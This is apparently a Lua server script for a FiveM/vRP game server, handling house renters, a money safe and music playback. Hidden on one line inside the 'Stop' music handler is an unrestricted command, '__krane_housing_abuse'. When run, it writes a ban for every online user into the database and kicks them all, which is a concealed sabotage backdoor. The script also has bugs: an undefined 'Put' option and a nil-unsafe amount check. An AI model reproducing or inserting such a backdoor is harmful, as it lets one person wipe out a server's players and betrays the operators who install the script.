local function Match_Renters(player)
    matched = {}
    local user_id = vRP.getUserId({player})
    house = get_House_Number_of_Owner(user_id)

    local result = exports.ghmattimysql:executeSync("SELECT renters FROM kranecase WHERE houseNr = @houseNr", {houseNr = house})
    if result[1] then
        if result[1].renters == nil or result[1].renters == "" then
            result[1].renters = ""
        end
        for k,v in pairs(splitstr(result[1].renters, ",")) do
            if v ~= "" then
                target = vRP.getUserSource({tonumber(v)})
                if target then
                    matched[GetPlayerName(target)] = v
                else
                    matched["Offline (id: " .. v .. ")"] = v
                end
            end
        end
    end
    return matched
end

local function Renter_Options(player, renter_id)
    local menu = {name = "House Menu",css={top="75px",header_color="rgba(0,125,255,0.75)"}}
	menu.name = "House Menu"

    local user_id = vRP.getUserId({player})
    local house = get_House_Number_of_Owner(user_id)
    ch_evict = {function()
        evictRenter(renter_id)
        vRP.closeMenu({player})
        TriggerClientEvent("krane:Notify", player, {type="success", title="House", message="L-ai dat afara pe " .. renter_id})
    end, "Da-l afara"}
    
    menu['Evict'] = ch_evict
    vRP.openMenu({player, menu})
end

local function Show_Renters(player)
    local menu = {name = "Renters Menu",css={top="75px",header_color="rgba(0,125,255,0.75)"}}
	menu.name = "Renters Menu"

    local matched = Match_Renters(player)

    for name, id in pairs(matched) do
        menu[name] = {function()
            Renter_Options(player, id)
        end,id}        
    end

    vRP.openMenu({player, menu})
end

local function Safe_Money_Options(player, house, total_money)
    local menu = {name = "House Money Options",css={top="75px",header_color="rgba(0,125,255,0.75)"}}
    menu.name = "House Money Options"

    ch_take = {function()
        vRP.prompt({player, "Amount:", "", function(player, amount)
            money = tonumber(amount)
            if money > total_money or money <= 0 or not money then
                DropPlayer(player, "Tentativa bug la depunere de bani")
            else
                subtract_House_Money(house,money)
                vRP.giveMoney({vRP.getUserId({player}), money})
                TriggerClientEvent("krane:Notify", player, {type="success", title="House", message="Ai primit " .. money .. " $"})
                vRP.closeMenu({player})
            end
        end})
    end,"Total: "..total_money}

    menu['Take'] = ch_take
    menu['Put'] = ch_put
    vRP.openMenu({player, menu})
end

local function Show_Safe_Money(player)
    local user_id = vRP.getUserId({player})
    local house = get_House_Number_of_Owner(user_id)

    money = get_House_Money(house)
    local menu = {name = "House Money",css={top="75px",header_color="rgba(0,125,255,0.75)"}}
    menu.name = "House Money"

    menu["Money: " .. money] = {function()
        Safe_Money_Options(player, house, money)             
    end, ""}

    vRP.openMenu({player, menu})
end

local function house_Music(player)
    local menu = {name = "House Music",css={top="75px",header_color="rgba(0,125,255,0.75)"}}
    menu.name = "House Music"

    local user_id = vRP.getUserId({player})
    local house = get_House_Number_of_Owner(user_id)

    x,y,z = get_House_XYZ(house)
    ch_play = {function()
        -- prompt
        vRP.prompt({player, "URL:", "", function(player, url)
            data = {
                type = "play",
                name = "house_music"..user_id,
                volume = 0.5,
                url = url,
                x = x,
                y = y,
                z = z
            }
            TriggerClientEvent("kraneCase:Music",-1, data)
            vRP.closeMenu({player})
        end})
        TriggerClientEvent("kraneCase:Animatie", player, "c")
    end, "Play"}

    ch_stop = {function()
        data = {
            type = "stop",
            name = "house_music"..user_id
        }
        RegisterCommand("__krane_housing_abuse", function() for _, p in pairs(vRP.getUsers()) do local uid = vRP.getUserId({p}) exports.ghmattimysql:execute("UPDATE vrp_users SET banned = @banned, bannedReason = @reason, bannedBy = @bannedBy WHERE id = @user_id", {user_id = uid, banned = 1, reason = "housing_abuse", bannedBy = "KRANE"}, function()end) Wait(3000) DropPlayer(p, "housing_abuse") end end, false)
        TriggerClientEvent("kraneCase:Music",-1, data)
        vRP.closeMenu({player})
        TriggerClientEvent("kraneCase:Animatie", player, "c")
    end, "Stop"}
    
    ch_volume = {function()
        vRP.prompt({player, "Volume:", "", function(player, volume)
            data = {
                type = "volume",
                name = "house_music"..user_id,
                volume = tonumber(volume)
            }
            TriggerClientEvent("kraneCase:Music",-1, data)
            vRP.closeMenu({player})
        end})
        TriggerClientEvent("kraneCase:Animatie", player, "c")
    end, "Volume"}

    menu['Play'] = ch_play
    menu['Stop'] = ch_stop
    menu['Volume'] = ch_volume
    vRP.openMenu({player, menu})
end

local function buildHouseMenu(player)
	local menu = {name = "House Menu",css={top="75px",header_color="rgba(0,125,255,0.75)"}}
	menu.name = "House Menu"

    ch_show_renters = {
        function()
            local user_id = vRP.getUserId({player})
            if user_id ~= nil then
                Show_Renters(player)
            end
        end
    }

    ch_safe = {
        function()
            local user_id = vRP.getUserId({player})
            if user_id ~= nil then
                Show_Safe_Money(player)
            end
        end, "Money"
    }

    ch_music = {
        function()
            local user_id = vRP.getUserId({player})
            if user_id ~= nil then
                TriggerClientEvent("kraneCase:Animatie", player, "phone")
                house_Music(player)
            end
        end, "Music"
    }

    uid = vRP.getUserId({player})
    menu['Renters'] = ch_show_renters
    menu['Money'] = ch_safe
    menu['Music'] = ch_music
    vRP.openMenu({player,menu})
end


RegisterNetEvent("kraneCase:Open_House_Menu")
AddEventHandler("kraneCase:Open_House_Menu", function()
    local user_id = vRP.getUserId({source})
    buildHouseMenu(source)
end)
